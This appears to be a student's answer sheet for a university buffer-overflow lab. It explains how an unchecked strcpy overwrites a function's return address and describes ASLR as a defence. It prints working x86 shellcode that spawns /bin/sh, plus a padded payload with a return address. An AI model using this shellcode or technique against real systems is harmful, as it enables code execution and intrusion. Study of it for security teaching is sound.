# Lab 2 Worksheet - Answers

Buffer overflow

## Task 1

When the `stack` program runs, it reads in a file into a character array which gets passted to a function before

```c
char buffer[24];
...
strcpy(buffer, str);
```

Is called. `str` and `buffer` both have different sizes so when `strcpy` is called it copies past the size of `buffer` and then *overflows* into the memory next to it on the stack.

Using this knowledge along with the address difference between the buffer and the return address of the function. We can overwrite the return address to be the address in memory of our buffer, which contains our shellcode (which looks like this)

```
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
```

We found the differnce in memory was 8 bytes (2 4 byte registers) and therefore, using gdb to find the address of the buffer we can write that into memory after padding enough memory space within the shell code (which looks like this)

```
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
90 90 90 90 90 90 90 90
ff ff cc e8
```

NB. the address changes depending on what the address of the buffer is (which becomes a problem in task 2)

## Task 2 - Defences

### 2.1 ASLR (Address space layout randomisation)

This makes the attack from task 1 harder to perform due to the fact that the memory address allocated to the buffer, changes each time the program is run. Although the difference in address space does not change, the place in memory does, therefore it is not possible to know the allocated address for the buffer in memory to put into the shell code before the program is run.


